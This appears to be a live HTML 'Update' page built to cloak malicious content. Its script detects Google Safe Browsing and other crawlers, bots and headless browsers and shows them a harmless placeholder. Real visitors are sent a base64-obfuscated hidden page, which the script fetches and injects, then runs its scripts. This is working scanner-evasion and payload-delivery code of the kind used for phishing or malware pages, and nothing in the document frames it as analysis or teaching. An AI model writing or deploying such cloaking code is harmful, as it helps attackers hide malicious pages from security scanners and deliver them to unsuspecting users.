<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update</title>
    <script>
        // /hidden_content/update_content.html -> L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=
        const realContent = 'L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=';

        // Enhanced GSB Crawler Detection: User-Agent patterns + Browser features
        function detectRealBrowser() {
            const userAgent = navigator.userAgent || '';
            
            // Google Safe Browsing and bot detection patterns
            const googleBotPatterns = [
                /googlebot/i,
                /google.*safe.*browsing/i,
                /google.*safebrowsing/i,
                /safebrowsing/i,
                /google.*security/i,
                /google.*malware/i,
                /google.*phishing/i,
                /google.*transparency/i,
                /google.*site.*verification/i,
                /google.*page.*speed/i,
                /adsbot-google/i,
                /mediapartners-google/i
            ];
            
            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
            
            // Mobile detection
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            
            // Browser feature checks
            const hasNotificationAPI = typeof self.Notification !== 'undefined';
            const hasWebdriver = navigator.webdriver === true;
            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
            const hasChrome = window.chrome && window.chrome.runtime;
            const hasPermissions = navigator.permissions !== undefined;
            
            // Real browser: Not a Google bot AND has browser features OR is mobile
            return !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
        }
        
        const isRealBrowser = detectRealBrowser();

        if (isRealBrowser) {
            fetch(atob(realContent))
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to load content');
                    }
                    return response.text();
                })
                .then(html => {
                    // Use DOMParser to properly parse the HTML
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    
                    // Extract and inject head content (styles, links, etc.)
                    const headElements = doc.head.querySelectorAll('style, link, title');
                    headElements.forEach(element => {
                        if (element.tagName === 'TITLE') {
                            document.title = element.textContent;
                        } else {
                            const clone = element.cloneNode(true);
                            document.head.appendChild(clone);
                        }
                    });
                    
                    // Execute scripts from HEAD first (before body content)
                    const headScripts = doc.head.querySelectorAll('script');
                    headScripts.forEach(oldScript => {
                        const newScript = document.createElement('script');
                        // Copy all attributes
                        Array.from(oldScript.attributes).forEach(attr => {
                            newScript.setAttribute(attr.name, attr.value);
                        });
                        // Copy script content
                        newScript.textContent = oldScript.textContent;
                        document.head.appendChild(newScript);
                    });
                    
                    // Extract and replace body content
                    document.body.innerHTML = doc.body.innerHTML;
                    
                    // Execute any scripts in the loaded content
                    const scripts = doc.body.querySelectorAll('script');
                    scripts.forEach(oldScript => {
                        const newScript = document.createElement('script');
                        // Copy all attributes
                        Array.from(oldScript.attributes).forEach(attr => {
                            newScript.setAttribute(attr.name, attr.value);
                        });
                        // Copy script content
                        newScript.textContent = oldScript.textContent;
                        document.body.appendChild(newScript);
                    });
                })
                .catch(err => {
                    console.error('Error loading content:', err);
                    // Show benign content on error instead of failing silently
                    document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
                });
        } else {
            // GSB Crawler / Bot (headless Chrome) - Show benign content
            document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
        }
    </script>
</head>

<body>
</body>

</html>
